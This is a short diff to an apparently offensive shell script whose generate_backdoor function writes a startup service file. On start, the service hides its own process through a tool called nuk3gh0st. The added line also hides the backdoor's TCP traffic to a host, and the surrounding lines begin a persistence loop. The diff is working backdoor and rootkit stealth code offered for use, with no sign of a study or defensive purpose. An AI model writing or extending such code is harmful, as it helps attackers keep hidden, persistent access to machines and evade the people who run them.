@@ -86,6 +86,7 @@ function generate_backdoor {
 	echo "	start)" >> $backdoor_path
 	echo "		sleep 40" >> $backdoor_path
 	echo "		/usr/bin/nuk3gh0st --hide-pid=\`echo \$$\`" >> $backdoor_path
+	echo "		/usr/bin/nuk3gh0st --hide-tcp-packet=$HOST" >> $backdoor_path
 	echo "" >> $backdoor_path
 	echo "		while true" >> $backdoor_path
 	echo "		do" >> $backdoor_path
